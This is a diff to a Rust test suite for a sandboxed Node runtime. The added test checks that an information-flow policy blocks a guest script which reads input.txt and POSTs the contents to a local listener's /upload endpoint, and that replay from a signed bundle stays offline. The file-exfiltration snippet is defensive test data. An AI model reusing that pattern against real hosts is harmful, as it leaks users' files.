@@ -149,6 +149,7 @@ mod native {
         ExplicitFrozen,
         AutomaticCommonJs,
         AutomaticEsm,
+        AutomaticIfcRefusal(std::net::SocketAddr),
     }
 
     struct Fixture {
@@ -183,6 +184,9 @@ mod native {
                 SourceMode::ExplicitFrozen | SourceMode::AutomaticCommonJs => {
                     format!("console.log(require('./replay-dependency.cjs')); {PROGRAM} {stop}")
                 }
+                SourceMode::AutomaticIfcRefusal(endpoint) => format!(
+                    "console.log(require('./replay-dependency.cjs')); const fs = require('fs'); const input = fs.readFileSync('input.txt', 'utf8'); const http = require('http'); const request = http.request('http://{endpoint}/upload', {{ method: 'POST' }}); request.on('error', () => {{}}); request.end(input); fs.writeFileSync('output.txt', input); console.log(input); {stop}"
+                ),
                 SourceMode::AutomaticEsm => {
                     fs::write(producer.path().join("package.json"), r#"{"type":"module"}"#)
                         .unwrap();
@@ -280,7 +284,18 @@ mod native {
                 &args,
                 Some(producer_state.path()),
             );
-            assert_eq!(recorded.status.success(), !guest_exception, "{recorded:?}");
+            if matches!(source_mode, SourceMode::AutomaticIfcRefusal(_)) {
+                // A real security incident may return the product's distinct
+                // containment exit code despite completed guest execution.
+                // Ordinary execution errors and supervisor failures remain
+                // refusals; the complete native witness is checked below.
+                assert!(
+                    matches!(recorded.status.code(), Some(0 | 91..=95)),
+                    "{recorded:?}"
+                );
+            } else {
+                assert_eq!(recorded.status.success(), !guest_exception, "{recorded:?}");
+            }
             if let Some(cfg_dir) = external_config_dir.as_ref() {
                 fs::create_dir_all(producer.path().join(".franken-node/keys")).unwrap();
                 for name in ["receipt-signing.key", "receipt-signing.pub"] {
@@ -299,7 +314,11 @@ mod native {
                 .unwrap();
             }
             let run: Value = serde_json::from_slice(&recorded.stdout).unwrap();
-            assert_eq!(run["success"], !guest_exception);
+            if matches!(source_mode, SourceMode::AutomaticIfcRefusal(_)) {
+                assert_eq!(run["success"], recorded.status.success());
+            } else {
+                assert_eq!(run["success"], !guest_exception);
+            }
             let capture = &run["dispatch"]["native_replay"];
             assert!(capture.is_object(), "{run}");
             assert_eq!(
@@ -308,6 +327,9 @@ mod native {
             );
             let payload: Value = serde_json::from_str(capture["payload_json"].as_str().unwrap())
                 .expect("exact retained execution inputs");
+            if matches!(source_mode, SourceMode::AutomaticIfcRefusal(_)) {
+                assert_eq!(payload["expected"]["terminal_state"], "completed", "{run}");
+            }
             if source_mode == SourceMode::EntryOnly {
                 assert!(payload["module_sources"].is_null());
             } else {
@@ -325,7 +347,9 @@ mod native {
                 match source_mode {
                     SourceMode::EntryOnly => "ORIGINAL\n",
                     SourceMode::AutomaticEsm => "ORIGINAL\ncaptured-dependency\n",
-                    SourceMode::ExplicitFrozen | SourceMode::AutomaticCommonJs => {
+                    SourceMode::ExplicitFrozen
+                    | SourceMode::AutomaticCommonJs
+                    | SourceMode::AutomaticIfcRefusal(_) => {
                         "captured-dependency\nORIGINAL\n"
                     }
                 },
@@ -654,6 +678,72 @@ mod native {
             )
         );
         fixture.assert_no_repeated_effects();
+    }
+
+    #[test]
+    fn native_counterfactual_regenerates_ifc_refusal_and_continues_offline_from_signed_bundle() {
+        use frankenengine_extension_host::host_io::{HostIoError, HostIoOutcome, HostIoRequest};
+
+        let sink = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        sink.set_nonblocking(true).unwrap();
+        let fixture = Fixture::new_with_sources(
+            false,
+            SourceMode::AutomaticIfcRefusal(sink.local_addr().unwrap()),
+        );
+        let payload: Value = serde_json::from_str(
+            fixture.source.initial_state_snapshot["native_replay"]["payload_json"]
+                .as_str()
+                .unwrap(),
+        )
+        .unwrap();
+        let effects: Vec<(HostIoRequest, HostIoOutcome)> =
+            serde_json::from_value(payload["host_effect_transcript"].clone()).unwrap();
+        assert_eq!(effects.len(), 3);
+        assert!(matches!(&effects[0].0, HostIoRequest::FsRead { .. }));
+        assert!(matches!(&effects[1],
+            (HostIoRequest::NetworkRequest { .. }, Err(HostIoError::Denied { reason }))
+                if reason == "FLOW_POLICY_BLOCKED"
+        ));
+        assert!(matches!(&effects[2].0, HostIoRequest::FsWrite { .. }));
+        assert_eq!(
+            sink.accept().unwrap_err().kind(),
+            std::io::ErrorKind::WouldBlock
+        );
+        fixture.archive_original_authority_and_inputs();
+
+        for (denied, terminal, consumed, unused) in [
+            ("env_read", "completed", 3, 0),
+            ("fs_write", "engine_failure", 2, 1),
+        ] {
+            let output = fixture.counterfactual(denied, "30000");
+            assert!(output.status.success(), "{output:?}");
+            let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+            assert_eq!(report["run_origin_verified"], true);
+            assert_eq!(report["runtime_origin_verified"], true);
+            let execution = &report["execution"];
+            assert_eq!(execution["baseline"]["matched"], true);
+            assert_eq!(execution["baseline"]["decisions_match"], true);
+            assert_eq!(execution["baseline"]["module_load_disabled"], false);
+            assert_eq!(execution["terminal_state"], terminal);
+            assert_eq!(execution["captured_host_effects"], 3);
+            assert_eq!(execution["consumed_host_effects"], consumed);
+            assert_eq!(execution["unused_original_host_effects"], unused);
+            assert_eq!(execution["denied_capabilities"], json!([denied]));
+            assert_eq!(execution["replay_certified"], false);
+            assert_eq!(execution["policy_equivalence_certified"], false);
+            assert_eq!(report["promotion_available"], false);
+            let observed_after_refusal = execution["console_output"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|entry| entry["message"] == "ORIGINAL");
+            assert_eq!(observed_after_refusal, terminal == "completed");
+            assert_eq!(
+                sink.accept().unwrap_err().kind(),
+                std::io::ErrorKind::WouldBlock
+            );
+            fixture.assert_no_repeated_effects();
+        }
     }
 
     #[test]
